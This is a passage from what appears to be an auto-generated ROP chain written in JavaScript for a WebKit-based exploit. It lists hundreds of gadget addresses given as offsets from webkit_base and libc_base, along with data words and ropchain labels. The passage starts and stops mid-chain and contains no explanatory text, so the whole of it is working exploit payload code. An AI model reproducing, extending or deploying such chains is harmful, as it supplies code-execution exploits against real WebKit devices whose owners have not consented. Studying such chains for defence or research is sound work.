db([29, 0]); // 0x1d
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1101896, //L1378
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1101912, //L1379
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1378:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1379:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1102000, //L1381
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1381:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1102056, //L1382
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1382:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1102128, //L1385
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1385:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1102184, //L1386
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1386:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
//L1388:
libc_base+144605, //pop rdi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1102336, //L1390
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1389:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1390:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1102424, //L1392
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1102440, //L1393
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1392:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1393:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1102584, //L1397
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1102552, //L1395
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1102568, //L1396
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1395:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1396:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1397:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1102656, //L1399
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1399:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1102712, //L1400
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1400:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1102792, //L1402
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1402:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1403:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1404:
db([30, 0]); // 0x1e
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1102904, //L1405
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1102920, //L1406
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1405:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1406:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1103008, //L1408
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1408:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1103064, //L1409
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1409:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1103136, //L1412
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1412:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1103192, //L1413
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1413:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1103296, //L1416
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1415:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+763368,); //pop rcx
//L1416:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1103384, //L1418
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1103400, //L1419
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1418:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1419:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1103544, //L1423
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1103512, //L1421
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1103528, //L1422
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1421:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1422:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1423:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1103616, //L1425
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1425:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1103672, //L1426
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1426:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1103752, //L1428
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1428:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1429:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1430:
db([7, 0]); // 0x7
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1103864, //L1431
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1103880, //L1432
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1431:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1432:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+835093, //sub rax, rcx ; sbb rdx, rcx
libc_base+764760, //pop rsi
ropchain+1103968, //L1434
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1434:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1104024, //L1435
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1435:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1104144, //L1438
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1437:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1438:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1104232, //L1440
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1104248, //L1441
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1440:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1441:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1104392, //L1445
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1104360, //L1443
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1104376, //L1444
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1443:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1444:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1445:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1104464, //L1447
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1447:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1104520, //L1448
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1448:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1104600, //L1450
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1450:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1451:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1452:
db([31, 0]); // 0x1f
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1104712, //L1453
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1104728, //L1454
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1453:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1454:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1104816, //L1456
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1456:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1104872, //L1457
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1457:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1104944, //L1460
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1460:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1105000, //L1461
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1461:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
//L1463:
libc_base+759608, //pop rax
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1105152, //L1465
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1464:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1465:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1105240, //L1467
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1105256, //L1468
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1467:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1468:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1105400, //L1472
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1105368, //L1470
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1105384, //L1471
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1470:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1471:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1472:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1105472, //L1474
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1474:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1105528, //L1475
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1475:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1105608, //L1477
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1477:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1478:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1479:
db([32, 0]); // 0x20
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1105720, //L1480
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1105736, //L1481
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1480:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1481:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1105824, //L1483
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1483:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1105880, //L1484
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1484:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1105952, //L1487
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1487:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1106008, //L1488
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1488:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1106112, //L1491
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1490:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1491:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1106200, //L1493
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1106216, //L1494
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1493:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1494:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1106360, //L1498
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1106328, //L1496
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1106344, //L1497
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1496:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1497:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1498:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1106432, //L1500
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1500:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1106488, //L1501
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1501:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1106568, //L1503
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1503:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1504:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1505:
db([37, 0]); // 0x25
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1106680, //L1506
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1106696, //L1507
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1506:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1507:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1106784, //L1509
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1509:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1106840, //L1510
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1510:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1106960, //L1513
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1512:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1513:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1107048, //L1515
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1107064, //L1516
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1515:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1516:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1107208, //L1520
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1107176, //L1518
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1107192, //L1519
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1518:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1519:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1520:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1107280, //L1522
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1522:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1107336, //L1523
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1523:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1107416, //L1525
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1525:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1526:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1527:
db([33, 0]); // 0x21
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1107528, //L1528
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1107544, //L1529
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1528:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1529:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1107632, //L1531
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1531:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1107688, //L1532
